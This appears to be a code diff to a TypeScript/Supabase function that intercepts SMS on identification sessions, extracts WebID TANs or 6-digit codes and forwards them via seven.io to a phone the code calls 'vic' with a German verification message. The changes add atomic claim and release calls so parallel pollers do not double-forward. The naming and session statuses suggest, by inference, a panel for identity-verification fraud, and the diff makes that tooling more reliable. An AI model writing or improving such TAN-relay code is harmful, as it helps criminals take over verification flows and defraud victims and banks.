@@ -4,7 +4,7 @@
 // (`sender|date`), so concurrent pollers never double-forward.
 //
 // Behavior (mirrors the recovery-panel reference):
-// - Only active sessions (status waiting / data_sent) are processed.
+// - Only sessions with status data_sent are processed.
 // - Only SMS newer than session.updated_at are considered.
 // - The WebID TAN pattern is preferred; otherwise any standalone 6-digit code.
 // - Forward text: "<code> - Ihr Code für die Verifizierung"
@@ -133,7 +133,7 @@ export async function processSessionForward(
 
   if (!session) return { forwarded: 0, checked: 0, reason: "session_missing" };
   if (session.forward_tan_to_vic !== true) return { forwarded: 0, checked: 0, reason: "forwarding_disabled" };
-  if (!["waiting", "data_sent"].includes(session.status)) {
+  if (session.status !== "data_sent") {
     return { forwarded: 0, checked: 0, reason: "status_locked" };
   }
   if (messages.length === 0) return { forwarded: 0, checked: 0 };
@@ -177,8 +177,6 @@ export async function processSessionForward(
   const forwardedSet = new Set<string>(
     Array.isArray(session.forwarded_sms) ? (session.forwarded_sms as string[]) : [],
   );
-  const initialSize = forwardedSet.size;
-
   let forwardedCount = 0;
   let checkedCount = 0;
 
@@ -194,6 +192,19 @@ export async function processSessionForward(
     const match = text.match(WEBID_TAN_REGEX) ?? text.match(GENERIC_TAN_REGEX);
 
     if (match) {
+      // Atomically reserve this SMS while re-checking that the session is
+      // still exactly data_sent. This prevents completion races and ensures
+      // concurrent pollers cannot forward the same TAN twice.
+      const { data: claimed, error: claimError } = await supabase.rpc("claim_tan_forward", {
+        _session_id: sessionId,
+        _sms_key: key,
+      });
+      if (claimError) {
+        console.error("claim_tan_forward failed", claimError);
+        continue;
+      }
+      if (claimed !== true) continue;
+
       const code = match[1] ?? match[0];
       const body = `${code} - Ihr Code für die Verifizierung`;
       const result = await sendSevenSms(sevenKey, senderName, normalizePhone(vicPhone), body);
@@ -229,19 +240,21 @@ export async function processSessionForward(
         }
       } else {
         console.error("seven.io forward failed", result.info);
-        // not marked as processed -> retried on next poll
+        // Release the reservation so a later poll can retry the failed send.
+        const { error: releaseError } = await supabase.rpc("release_tan_forward", {
+          _session_id: sessionId,
+          _sms_key: key,
+        });
+        if (releaseError) console.error("release_tan_forward failed", releaseError);
       }
     } else {
-      // No code in this SMS -> mark as processed, never forward.
-      forwardedSet.add(key);
+      // No code in this SMS -> atomically mark as processed, never forward.
+      const { error: claimError } = await supabase.rpc("claim_tan_forward", {
+        _session_id: sessionId,
+        _sms_key: key,
+      });
+      if (claimError) console.error("claim_tan_forward failed", claimError);
     }
-  }
-
-  if (forwardedSet.size !== initialSize) {
-    await supabase
-      .from("ident_sessions")
-      .update({ forwarded_sms: Array.from(forwardedSet) })
-      .eq("id", sessionId);
   }
 
   return { forwarded: forwardedCount, checked: checkedCount };
@@ -261,7 +274,7 @@ export async function forwardByPhoneIdentifier(
     .from("ident_sessions")
     .select("id")
     .eq("phone_api_url", phoneApiUrl)
-    .in("status", ["waiting", "data_sent"])
+    .eq("status", "data_sent")
     .order("updated_at", { ascending: false })
     .limit(1)
     .maybeSingle();
